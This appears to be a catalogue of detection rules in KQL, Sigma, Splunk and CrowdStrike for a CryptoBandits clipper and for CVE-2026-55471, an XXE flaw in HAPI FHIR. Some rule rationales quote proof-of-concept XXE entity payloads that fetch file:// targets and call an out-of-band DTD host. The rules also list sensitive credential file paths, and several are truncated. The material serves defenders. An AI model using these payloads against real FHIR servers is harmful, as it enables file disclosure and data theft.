CryptoBandits cfile payload artifact created under Public\Documents AIDelivery High
Detects creation of a file literally named cfile under C:\Users\Public\Documents — the article-specific artifact where the clipper stores attacker-supplied code downloaded from the Tor C2 /stub.php endpoint and later invoked via the EVAL command. Rationale: Article explicitly names the on-disk artifact: 'A file named "cfile" is created on the infected system as an output for payload hosted on the C2 domain' and ties it to the EVAL remote-code-execution path — high-fidelity host-side IOC for active EVAL tasking.
ATT&CKT1105 T1059.007
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer creating a file legitimately named cfile in Public\Documents (extremely rare)
  • Cross-platform configuration tool dropping a generic cfile artifact
  • Custom in-house script using cfile as a temporary write target
  • Forensic analyst restoring the sample during a sanctioned investigation
Response runbook
1) Triage: capture SHA256 and contents of cfile (it should be JScript) — strings-scan for ActiveXObject, WScript.Shell, eval; pull InitiatingProcessFileName to see which wscript.exe / ugate.exe-tied process wrote it. 2) Contain: isolate the host, terminate the writing process tree, and quarantine cfile plus the surrounding 5-char folder. 3) Hunt: this is evidence of an active EVAL session — search DeviceProcessEvents on the same host for any new child processes spawned by wscript.exe in the 60 minutes around the cfile write and treat anything novel as attacker-supplied code.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where FileName =~ "cfile"

title: CryptoBandits cfile Payload Artifact In Public Documents
id: 4e1d7b22-9c83-44a5-8a39-c25b6d7e1f08
description: Detects creation of a file literally named 'cfile' under C:\Users\Public\Documents — the artifact CryptoBandits writes after downloading attacker code from /stub.php on the Tor C2, later invoked via the EVAL command.
references:
  - https://www.microsoft.com/en-us/security/blog/2026/06/17/crypto-clipper-uses-tor-worm-like-propagation-for-persistence-control/
author: thn-usecases

  - attack.t1105
  - attack.t1059.007
logsource:

level: high

#event_simpleName=FileWritten TargetFileName=/\\Users\\Public\\Documents\\.+\\cfile$/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())

| convert ctime(firstTime), ctime(lastTime)

WScript or CScript with Public\Documents JS spawning curl, schtasks, cmd, or PowerShell child AIActions on Objectives High
Correlates the CryptoBandits JS loader (wscript.exe / cscript.exe whose command line points into C:\Users\Public\Documents) with its hands-on follow-on tooling: curl.exe (Tor exfil), schtasks.exe (persistence), cmd.exe / powershell.exe (EVAL backdoor execution). Each spawned child plus this parent is essentially an in-the-clear backdoor session. Rationale: Article maps the EVAL command to runtime JScript execution, then schedules persistence via schtasks and uses curl for Tor exfiltration — anchoring on a wscript/cscript parent whose command line still references Public\Documents .js + any of those four children is the cleanest chain signature.
ATT&CKT1059.007 T1059.001 T1059.003 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate WSH-based deployment script under Public\Documents launching schtasks (uncommon — verify the JS file)
  • Vendor support utility scripted in JS that spawns curl for telemetry uploads
  • RMM/automation tool running JS workflows that shell out to PowerShell
  • Internal red-team simulation reusing this exact parent-child chain
Suppression filter
| where InitiatingProcessFolderPath !has @"\Program Files\" and InitiatingProcessFolderPath !has @"\Program Files (x86)\"
Response runbook
1) Triage: pull both the parent (wscript/cscript) and child command lines — note the .js path and any curl --socks5-hostname or schtasks /xml arguments; capture the parent's full process tree from MDE. 2) Contain: isolate, kill the parent process and all descendants, quarantine the JS file and any spawned cfile or scheduled-task XML. 3) Hunt: pivot the parent JS SHA256 across the org, expand to UC4 (ugate.exe), and review DeviceFileEvents for .lnk files written to removable drives by the same parent — that uncovers the USB worm propagation step.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("wscript.exe", "cscript.exe")
| where InitiatingProcessCommandLine has @"\Users\Public\Documents\"
| where InitiatingProcessCommandLine has ".js"
| where FileName in~ ("curl.exe", "schtasks.exe", "cmd.exe", "powershell.exe", "pwsh.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith @"\wscript.exe" or ParentProcessName endswith @"\cscript.exe"
| where CommandLine has_any ("curl.exe", "schtasks.exe", "cmd.exe", "powershell.exe", "pwsh.exe")
   or NewProcessName endswith @"\curl.exe"
   or NewProcessName endswith @"\schtasks.exe"
   or NewProcessName endswith @"\cmd.exe"
   or NewProcessName endswith @"\powershell.exe"
   or NewProcessName endswith @"\pwsh.exe"
| join kind=inner (
    SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where NewProcessName endswith @"\wscript.exe" or NewProcessName endswith @"\cscript.exe"
    | where CommandLine has @"\Users\Public\Documents\" and CommandLine has ".js"
    | project ParentPid = NewProcessId, ParentCmd = CommandLine, ParentName = NewProcessName, ParentHost = Computer
) on $left.ProcessId == $right.ParentPid and $left.Computer == $right.ParentHost
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName, ParentCmd
| order by TimeGenerated desc
title: WSH Script From Public Documents Spawning Curl Schtasks Or Shells (CryptoBandits Backdoor)
id: a72f8c3d-4e91-4b0a-9f3c-bd4e7a82f561
description: Detects wscript.exe or cscript.exe — driven by a JS payload from C:\Users\Public\Documents — spawning curl.exe, schtasks.exe, cmd.exe or powershell.exe. This is the in-the-clear chain of the CryptoBandits Tor backdoor's EVAL and tasking workflow.
references:
  - https://www.microsoft.com/en-us/security/blog/2026/06/17/crypto-clipper-uses-tor-worm-like-propagation-for-persistence-control/
author: thn-usecases

detection:

    ParentImage|endswith:
      - '\wscript.exe'
      - '\cscript.exe'
    ParentCommandLine|contains: '\Users\Public\Documents\'
    ParentCommandLine|contains: '.js'
  child:
    Image|endswith:
      - '\curl.exe'
      - '\schtasks.exe'
      - '\cmd.exe'
      - '\powershell.exe'

level: high
source:(windows.sysmon OR windows.security) (@EventID:1 OR @EventID:4688) @ParentImage:(*\wscript.exe OR *\WScript.exe OR *\WSCRIPT.EXE OR *\cscript.exe OR *\CScript.exe OR *\CSCRIPT.EXE) @ParentCommandLine:(*"\\Users\\Public\\Documents\\"* AND *".js"*) @Image:(*\curl.exe OR *\CURL.EXE OR *\schtasks.exe OR *\SCHTASKS.EXE OR *\cmd.exe OR *\CMD.EXE OR *\powershell.exe OR *\POWERSHELL.EXE OR *\pwsh.exe)

| ImageFileName=/\\(curl|schtasks|cmd|powershell|pwsh)\.exe$/i

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false

            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8") or SHA1 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8") or MD5 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8") or SHA1 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8") or MD5 in~ ("7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["7630debd35cac6b7d58c4427695579b3e3a8b1cc462f523234cd6c698882a68c", "a7abf1d9d6686af1cefcd60b17a312e7eb8cfe267def1ec34aeab6128c811630", "23c1e673f315dafa14b73034a90dd3d393a984451ff6601b8be8142be6487b43", "cf9fc891ea5ca5ecd8113ef3e69f6f52ff538b6cccbdaa9559106fc72bc6da30", "100407796028bf3649752d9d2a67a0e4394d752eb8de86daa42920e814f3fae8"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )

[GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory

GitHub Security Advisories
2026-06-17 8 use cases 1 technique 5 kill-chain phases detected

HAPI FHIR: XXE in XsltUtilities.saxonTransform via unhardened Saxon TransformerFactory

CVEsCVE-2026-55471
ATT&CKT1190

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Vulnerable HAPI FHIR org.hl7.fhir.utilities < 6.9.10 in software inventory (CVE-2026-55471) · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] HAPI FHIR XXE: DOCTYPE/ENTITY SYSTEM payload posted to FHIR endpoint (CVE-2026-55471) · [LLM] HAPI FHIR XXE: parameter-entity (<!ENTITY %) OOB exfil pattern on FHIR endpoint
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-55471: HAPI FHIR: XXE in XsltUtilities.saxonTransform
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] HAPI FHIR JVM out-of-band callback to non-corporate destination (XXE OOB exfil) · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] JVM serving HAPI FHIR reads sensitive local files (XXE file:// disclosure)
HAPI FHIR XXE: DOCTYPE/ENTITY SYSTEM payload posted to FHIR endpoint (CVE-2026-55471) AIExploitation Medium
Hunts inbound HTTP POST/PUT to FHIR API paths whose XML body carries XXE markers (<!DOCTYPE … <!ENTITY … SYSTEM 'file://' or 'http://'). Targets the entry-point of CVE-2026-55471 where attacker-controlled XML is fed to XsltUtilities.saxonTransform with an unhardened Saxon TransformerFactory. Rationale: Article specifies the entry point is XML fed to XsltUtilities.saxonTransform; PoC literally shows '<!DOCTYPE root [' + '<!ENTITY canary SYSTEM "file://..."' + '<!ENTITY % oob SYSTEM "http://..."'. FHIR URL fragments come from standard HAPI deployments. Corroborated via vulnerability.circl.lu GHSA-2F55-G35J-5JMF entry. Cross-checked against: • https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf • https://github.com/advisories/GHSA-2f55-g35j-5jmf
ATT&CKT1190 T1071.001
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Internal Burp/ZAP/Nuclei scans hitting FHIR endpoints with XXE payloads as part of authorized AppSec testing
  • Legitimate FHIR XML payloads that include a benign internal DOCTYPE (rare but possible for IG packages)
  • Health-IT interop tools that embed XSD references via DOCTYPE during conformance testing
  • WAF echo-back / debug logs that quote the original payload back into the log line
Suppression filter
| where RequestClientApplication !has_any ("Burp","ZAP","Nuclei","sqlmap","Acunetix") and SourceIP !in ("<known_scanner_ips>")
Response runbook
1) TRIAGE — Pull the full request body and confirm an external SYSTEM identifier (file://, http://, https://, jar:, netdoc:). Map the destination FHIR endpoint to its backing JVM/container and check whether HAPI FHIR org.hl7.fhir.utilities < 6.9.10 is present. 2) CONTAIN — Block the source IP at the WAF, drop any in-flight session, and add a virtual patch rule that rejects FHIR POST/PUT bodies containing <!DOCTYPE or <!ENTITY. If exploitation confirmed, isolate the FHIR app server and rotate any local secrets the JVM could read. 3) HUNT — Pivot on the source IP across the last 30d for other FHIR endpoints and parameter-entity variants (UC2). Pull DeviceFileEvents on the JVM host for /etc/passwd, application.properties, ~/.aws/credentials reads (UC3). Pull DeviceNetworkEvents for outbound HTTP/DNS from java.exe to the attacker-controlled OOB domain (UC4).
// Defender XDR does not capture HTTP request bodies; pivot is the FHIR endpoint URL hit (DeviceNetworkEvents shows the host:port + URL fragment only). Pair with WAF logs in Sentinel (sentinel_kql below) for body inspection.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted" or ActionType == "ConnectionInbound"
| where RemoteUrl has_any ("/fhir/","/hl7/fhir/","/baseR4/","/baseDstu3/","/StructureDefinition","/ValueSet")
| where InitiatingProcessFileName in~ ("java.exe","javaw.exe","tomcat.exe","tomcat9.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, LocalPort
| order by Timestamp desc
let FhirPaths = dynamic(["/fhir/","/hl7/fhir/","/baseR4/","/baseDstu3/","/StructureDefinition","/ValueSet","/metadata"]);
let XxeMarkers = dynamic(["<!DOCTYPE","<!ENTITY","SYSTEM \"file:","SYSTEM \"http:","SYSTEM 'file:","SYSTEM 'http:"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod in ("POST","PUT")
| where RequestURL has_any (FhirPaths)
| extend BodyCandidates = strcat(tostring(DeviceCustomString1), "|", tostring(DeviceCustomString2), "|", tostring(DeviceCustomString3), "|", tostring(DeviceCustomString4), "|", tostring(DeviceCustomString5), "|", tostring(DeviceCustomString6), "|", tostring(RequestContext), "|", tostring(Message))
| where BodyCandidates has_any (XxeMarkers)
| project TimeGenerated, SourceIP, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, BodyExcerpt = substring(BodyCandidates, 0, 1024), DeviceVendor, DeviceProduct
| order by TimeGenerated desc
title: HAPI FHIR XXE Payload in HTTP Body (CVE-2026-55471)
id: 8e2a0c14-9e7f-4d5a-bf3e-5471a55471aa
status: experimental
description: Detects inbound HTTP POST/PUT to FHIR endpoints whose body contains XML External Entity declarations, the entry vector for CVE-2026-55471 in HAPI FHIR XsltUtilities.saxonTransform.
references:
  - https://github.com/advisories/GHSA-2f55-g35j-5jmf
  - https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf

date: 2026/06/18

detection:
  selection_method:
    cs-method:
      - POST
      - PUT
  selection_path:
    cs-uri-stem|contains:
      - '/fhir/'
      - '/hl7/fhir/'
      - '/baseR4/'
      - '/baseDstu3/'
      - '/StructureDefinition'
      - '/ValueSet'
  selection_body:

      - '<!ENTITY'
      - 'SYSTEM "file:'
      - 'SYSTEM "http:'
  condition: selection_method and selection_path and selection_body
falsepositives:
  - Legitimate FHIR clients using internal DTDs (rare in modern FHIR XML)
  - Security scanners (Burp, ZAP, Nuclei) testing the same endpoints
level: high

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where Web.http_method in ("POST","PUT") (Web.url="*/fhir/*" OR Web.url="*/hl7/fhir/*" OR Web.url="*/baseR4/*" OR Web.url="*/baseDstu3/*" OR Web.url="*/StructureDefinition*" OR Web.url="*/ValueSet*") by Web.src Web.dest Web.url Web.http_method Web.user Web.http_user_agent _raw | `drop_dm_object_name(Web)` | search _raw="*<!DOCTYPE*" OR _raw="*<!ENTITY*SYSTEM*" | rex field=_raw "(?i)(?<xxe_marker><!ENTITY[^>]+SYSTEM\s+[\"'](?:file|http|https|ftp|jar|netdoc|gopher):[^\"']+[\"'])" | where isnotnull(xxe_marker) | convert ctime(firstTime) ctime(lastTime)

HAPI FHIR XXE: parameter-entity (<!ENTITY %) OOB exfil pattern on FHIR endpoint AIExploitation High
Higher-fidelity sibling of the generic DOCTYPE hunt: matches only payloads that declare a parameter entity (<!ENTITY %) with an external SYSTEM identifier, the exact pattern used for blind XXE / SSRF in the article's PoC. Parameter entities are vanishingly rare in benign FHIR traffic. Rationale: Article's PoC uses `<!ENTITY % oob SYSTEM "http://127.0.0.1:port/evil-fhir-xslt-ssrf.dtd">` to set up OOB exfil — the parameter-entity construct (`%`) is the distinguishing signature of XXE-via-DTD attacks and almost never appears in legitimate FHIR XML. Much lower-FP than UC1's generic DOCTYPE/ENTITY hunt. Cross-checked against: • https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf
ATT&CKT1190 T1071.004
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized AppSec scanning by internal red team / Burp Pro extensions
  • Bug-bounty researcher probing exposed FHIR test environments
  • FHIR conformance test harnesses that embed parameter entities in edge-case test vectors (extremely rare)
  • Researcher proof-of-concepts in pre-prod where the source IP belongs to an internal pentest range
Suppression filter
| where SourceIP !in ("<internal_appsec_scanner_ips>") and RequestClientApplication !has_any ("Burp","ZAP","Nuclei","sqlmap")
Response runbook
1) TRIAGE — This signature is high-fidelity; treat any hit as exploitation attempt until proven otherwise. Capture the full Body, the source IP, the targeted FHIR resource path, and the parent JVM hostname. Confirm HAPI FHIR version on the receiver. 2) CONTAIN — Block source IP at WAF immediately. Apply ModSecurity / WAF rule to drop any inbound XML containing `<!ENTITY %` for FHIR endpoints regardless of upgrade status. Snapshot the JVM heap if exploit may have succeeded so artefacts can be retrieved later. 3) HUNT — Pivot to UC4 (java.exe outbound to the OOB callback domain in the SYSTEM URI) and UC3 (java.exe reading sensitive local files). Search the WAF for the same source IP over 30d on any FHIR-shaped path. Cross-check the OOB host/IP against threat-intel feeds and add to the Sentinel ThreatIntelligenceIndicator table.
// Defender XDR has no HTTP body visibility; this detection lives in WAF/proxy logs surfaced through Sentinel. The Defender query below is the host-side companion: JVM serving FHIR that immediately performs an outbound HTTP fetch to a public IP (the parameter-entity callback).
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where InitiatingProcessFileName in~ ("java.exe","javaw.exe")
| where RemoteIPType == "Public"
| where RemotePort in (80, 443, 8080, 8443)
| where InitiatingProcessCommandLine has_any ("hapi","org.hl7.fhir","tomcat","jetty","spring-boot","wildfly")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc
let FhirPaths = dynamic(["/fhir/","/hl7/fhir/","/baseR4/","/baseDstu3/","/StructureDefinition","/ValueSet","/metadata"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod in ("POST","PUT")
| where RequestURL has_any (FhirPaths)
| extend Body = strcat(tostring(DeviceCustomString1),"|",tostring(DeviceCustomString2),"|",tostring(DeviceCustomString3),"|",tostring(DeviceCustomString4),"|",tostring(DeviceCustomString5),"|",tostring(DeviceCustomString6),"|",tostring(RequestContext),"|",tostring(Message))
| where Body matches regex @"(?i)<!ENTITY\s+%\s+\w+\s+SYSTEM\s+[""'](?:file|http|https|ftp|jar|netdoc|gopher):"
| extend ParamEntity = extract(@"(?i)(<!ENTITY\s+%\s+\w+\s+SYSTEM\s+[""'][^""']+[""'])", 1, Body)
| project TimeGenerated, SourceIP, DestinationHostName, RequestURL, RequestClientApplication, ParamEntity, BodyExcerpt = substring(Body, 0, 1024)
| order by TimeGenerated desc

JVM serving HAPI FHIR reads sensitive local files (XXE file:// disclosure) AIActions on Objectives High
Detects post-exploitation file reads by the JVM hosting HAPI FHIR: /etc/passwd, /etc/shadow, /etc/hosts, application.properties, application.yml, cloud credentials, and Kubernetes secrets. Catches the file:// SYSTEM-entity arm of CVE-2026-55471 regardless of whether the inbound WAF caught the payload. Rationale: Article's PoC uses `<!ENTITY canary SYSTEM "file://...">` to read a temp file containing `TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2`. Real attackers will pivot to /etc/passwd, application.properties (DB creds), and cloud-credential files. JVM as the reader + Java-app-server cmdline narrows scope. Corroborated against vulnerability.circl.lu confirmation of the file-disclosure exploitation primitive. Cross-checked against: • https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf
ATT&CKT1005 T1083 T1552.001
Data sourcesEndpoint.Filesystem Endpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • HAPI FHIR legitimately loading its own application.yml / hapi.properties from its install directory at startup
  • Spring Boot Actuator config refresh reading application config
  • Backup/snapshot tooling that crawls the FHIR app directory and triggers file-access events on config
  • Sysadmin running diagnostic tools (strace, jstack against the JVM) that incidentally surface as the JVM touching these files
Suppression filter
| where not (FolderPath endswith "hapi.properties" and FolderPath startswith "/opt/hapi-fhir/") and not (FolderPath endswith "application.yml" and FolderPath has "/conf/")
Response runbook
1) TRIAGE — Confirm the JVM in question is the FHIR app server (check parent process tree, listening ports, classpath). Pull the timestamp of the file read and look ±60s in CommonSecurityLog / Web datamodel for an inbound POST/PUT to a FHIR endpoint (UC1/UC2). 2) CONTAIN — Stop the JVM, snapshot heap + thread dump, isolate the host from network. Rotate every secret the JVM could read (application.properties DB creds, AWS access keys, K8s service-account tokens, SSH keys). 3) HUNT — Run UC4 to look for OOB exfil of the file contents to attacker-controlled domains. Search the same JVM hosts for inbound traffic to FHIR endpoints from the source IP over the past 30d. Apply the WAF virtual-patch from UC2 to every FHIR-fronting WAF.
let SensitivePaths = dynamic(["/etc/passwd","/etc/shadow","/etc/hosts","/etc/krb5.conf","application.properties","application.yml","hapi.properties","/.aws/credentials","/.aws/config","/.kube/config","/.ssh/id_rsa","web.config","/var/run/secrets/kubernetes.io"]);
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java.exe","java","javaw.exe")
| where InitiatingProcessCommandLine has_any ("hapi","org.hl7.fhir","hapi-fhir","tomcat","jetty","wildfly","spring-boot")
| where ActionType in ("FileCreated","FileRenamed","FileModified","FileAccessed","FileOpened")
| where FolderPath has_any (SensitivePaths)
| where not (FolderPath has_any ("target/classes","/opt/hapi-fhir/conf/application.yml","<known_legitimate_config_paths>"))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FolderPath, FileName, InitiatingProcessAccountName
| order by Timestamp desc
let SensitivePaths = dynamic(["/etc/passwd","/etc/shadow","/etc/hosts","application.properties","application.yml","hapi.properties","/.aws/credentials","/.kube/config","/.ssh/id_rsa","/var/run/secrets/kubernetes.io"]);
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("java","javaw.exe","java.exe")
| where ActingProcessCommandLine has_any ("hapi","org.hl7.fhir","hapi-fhir","tomcat","jetty","wildfly","spring-boot")
| where EventType in ("FileAccessed","FileRead","FileOpened","FileCreated")
| where TargetFilePath has_any (SensitivePaths)
| project TimeGenerated, DvcHostname, ActingProcessName, ActingProcessCommandLine, EventType, TargetFilePath, ActorUsername
| order by TimeGenerated desc

HAPI FHIR JVM out-of-band callback to non-corporate destination (XXE OOB exfil) AICommand & Control Medium
Detects the SSRF / blind-XXE arm of CVE-2026-55471: the FHIR-serving JVM makes an outbound HTTP fetch or DNS lookup to a public destination it has never previously contacted, immediately after an inbound POST/PUT to a FHIR endpoint. Captures both the parameter-entity DTD fetch and the file-content exfil pattern. Rationale: PoC sets up `<!ENTITY % oob SYSTEM "http://127.0.0.1:port/evil-fhir-xslt-ssrf.dtd">` and the JVM resolves it, generating an outbound HTTP request from the Saxon TransformerFactory. Real attackers replace 127.0.0.1 with attacker.com. Anti-join against 30d baseline turns 'JVM made an HTTP request' into 'JVM contacted a destination it never contacted before'. Corroborated against vulnerability.circl.lu confirmation of SSRF primitive. Cross-checked against: • https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf
ATT&CKT1041 T1071.001 T1071.004 T1190
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • HAPI FHIR pulling new external IG (Implementation Guide) packages from a registry (registry.fhir.org, packages.simplifier.net)
  • JVM auto-update / Maven Central / Spring Boot Actuator phoning home
  • Newly-onboarded healthcare partner whose endpoint URL is genuinely contacted for the first time
  • Container image rebuilds that change the destination set seen at runtime
Suppression filter
| where not (RemoteUrl has_any ("registry.fhir.org","packages.simplifier.net","packages2.fhir.org","repo.maven.apache.org","repo1.maven.org","jcenter.bintray.com"))
Response runbook
1) TRIAGE — Confirm the destination domain/IP is not a known FHIR registry (registry.fhir.org, packages.simplifier.net, packages2.fhir.org). Look at the immediate-prior inbound HTTP requests to the JVM (CommonSecurityLog / W3CIISLog within 60s before the outbound) for FHIR endpoint POST/PUT carrying the matching attacker domain in a SYSTEM identifier. 2) CONTAIN — If the destination is an attacker callback, block it at egress firewall + add to ThreatIntelligenceIndicator. Rotate any secrets that may have been leaked over the channel (assume worst case — UC3 enumerates targets). 3) HUNT — Pivot on the attacker destination across all JVM hosts in the estate over the past 30d. Pull the file-read events from UC3 in the same time window. Check whether the attacker domain appears in DNS logs from other hosts (lateral targeting).

Vulnerable HAPI FHIR org.hl7.fhir.utilities < 6.9.10 in software inventory (CVE-2026-55471) AIReconnaissance High
